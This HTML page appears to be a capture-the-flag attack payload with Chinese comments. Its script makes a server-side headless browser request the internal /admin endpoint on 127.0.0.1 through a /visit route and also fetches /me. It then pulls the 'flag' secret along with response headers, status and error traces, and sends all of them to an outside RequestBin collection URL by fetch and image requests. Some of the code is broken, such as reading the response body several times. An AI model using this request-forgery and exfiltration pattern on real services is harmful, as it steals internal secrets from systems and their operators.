<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Send Env FLAG</title>
</head>
<body>
<script>
    // ########## 替换成你能通的公网接收地址（比如新的RequestBin/自己的接口）##########
    const YOUR_RECEIVE_URL = "http://www.requestbin.cn:80/1fn11tu1"; // 例：https://en8x0z9p37r.x.pipedream.net/
    fetch(YOUR_RECEIVE_URL+'?id='+Math.random());
    // ###########################################################################
    const param = {"url":"http://127.0.0.1:3000/admin"};
    // 核心：访问/admin获取环境变量的FLAG，Puppeteer同域无跨域，直接解析JSON
    fetch('/visit',{
      method: 'POST', // 必须指定为 POST
      headers: {
        'Content-Type': 'application/json; charset=utf-8', // 声明 JSON 格式
        // 可选：添加其他请求头（如 Token）
        // 'Authorization': 'Bearer ' + token
      },
      body: JSON.stringify(param) // 将 JS 对象转为 JSON 字符串
    })
        .then(res => {
            
            const respStatus = res.status;
             fetch(YOUR_RECEIVE_URL+'?respS='+respStatus);
            const headersArr = Array.from(res.headers.entries()).map(([key, value]) => `${key}: ${value}`);
            fetch(YOUR_RECEIVE_URL+'?headersArr='+headersArr);
            const respJson = res.json();
            fetch(YOUR_RECEIVE_URL+'?respJson='+respJson);
            
            
            // 2. 转成字符串（用换行分隔，也可以用逗号 "," 分隔）
            //const headersStr = headersArr.join('\n');
            fetch(YOUR_RECEIVE_URL+'?res='+respJson);
            if (res.ok){ 
             
                fetch(YOUR_RECEIVE_URL+'?json='+res.json());
                return res.json();
            }; // 仅解析admin返回的合法JSON
            throw new Error('非200响应');
        })
        .then(data => {
            const envFlag = data.flag; // 拿到环境变量里的FLAG
            console.log('[ENV-FLAG] 成功获取环境变量FLAG：', envFlag);
            fetch(YOUR_RECEIVE_URL+'?flag='+envFlag);
            // 关键：用img标签发送GET请求（无跨域限制，容器内网络兼容性最强）
            // 把FLAG拼接到URL参数，接收端直接读取即可
            const sendUrl = `${YOUR_RECEIVE_URL}?env_flag=${encodeURIComponent(envFlag)}`;
            const img = new Image();
            img.src = sendUrl; // 发起GET请求，发送FLAG
            img.onload = () => console.log('[ENV-FLAG] FLAG发送成功：', sendUrl);
            img.onerror = (err) => console.log('[ENV-FLAG] FLAG发送失败：', err);
        })
        .catch(err => {
            console.error('[ENV-FLAG] 获取/发送FLAG失败：', err.message);
            fetch(YOUR_RECEIVE_URL+'?err='+err.stack);
        });
    fetch('/me')
        .then(res => {
            
            const respStatus = res.status;
             fetch(YOUR_RECEIVE_URL+'?respS2='+respStatus);
            const headersArr = Array.from(res.headers.entries()).map(([key, value]) => `${key}: ${value}`);
            fetch(YOUR_RECEIVE_URL+'?headersArr2='+headersArr);
            const respJson = res.json();
            fetch(YOUR_RECEIVE_URL+'?respJson2='+respJson);
            
            
            // 2. 转成字符串（用换行分隔，也可以用逗号 "," 分隔）
            //const headersStr = headersArr.join('\n');
            fetch(YOUR_RECEIVE_URL+'?res='+respStatus+':'+headersArr);
            if (res.ok){ 
             
                fetch(YOUR_RECEIVE_URL+'?json='+res.json());
                return res.json();
            }; // 仅解析admin返回的合法JSON
            throw new Error('非200响应');
        })
        .then(data => {
            const envFlag = data.flag; // 拿到环境变量里的FLAG
            console.log('[ENV-FLAG] 成功获取环境变量FLAG：', envFlag);
            fetch(YOUR_RECEIVE_URL+'?flag='+envFlag);
            // 关键：用img标签发送GET请求（无跨域限制，容器内网络兼容性最强）
            // 把FLAG拼接到URL参数，接收端直接读取即可
            const sendUrl = `${YOUR_RECEIVE_URL}?env_flag=${encodeURIComponent(envFlag)}`;
            const img = new Image();
            img.src = sendUrl; // 发起GET请求，发送FLAG
            img.onload = () => console.log('[ENV-FLAG] FLAG发送成功：', sendUrl);
            img.onerror = (err) => console.log('[ENV-FLAG] FLAG发送失败：', err);
        })
        .catch(err => {
            console.error('[ENV-FLAG] 获取/发送FLAG失败：', err.message);
            fetch(YOUR_RECEIVE_URL+'?err2='+err.stack);
        });
</script>
</body>
</html>
